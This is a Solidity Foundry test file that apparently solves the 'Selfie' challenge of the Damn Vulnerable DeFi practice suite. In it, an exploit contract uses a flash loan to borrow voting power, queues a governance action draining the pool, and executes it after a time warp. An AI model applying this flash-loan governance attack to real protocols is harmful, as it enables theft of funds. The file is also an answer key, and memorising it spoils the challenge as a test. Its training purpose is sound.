// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Exploit is IERC3156FlashBorrower {
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
    SimpleGovernance immutable governance;
    SelfiePool immutable pool;
    address immutable recovery;
    uint256 actionId;

    constructor(SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        governance = _governance;
        pool       = _pool;
        recovery   = _recovery;
    }

    function setup(address token) public {
        pool.flashLoan(IERC3156FlashBorrower(this), token, TOKENS_IN_POOL, "");
    }

    function win() public {
        governance.executeAction(actionId);
    }

    function onFlashLoan(address, address token, uint256, uint256, bytes calldata) public returns (bytes32) {
            DamnValuableVotes(token).delegate(address(this));
            actionId = governance.queueAction(address(pool), 0, abi.encodeCall(SelfiePool.emergencyExit, (recovery)));
            DamnValuableVotes(token).approve(address(pool), TOKENS_IN_POOL);
            return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(governance, pool, recovery);

        exploit.setup(address(token));
        vm.warp(block.timestamp + 3 days);
        exploit.win();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
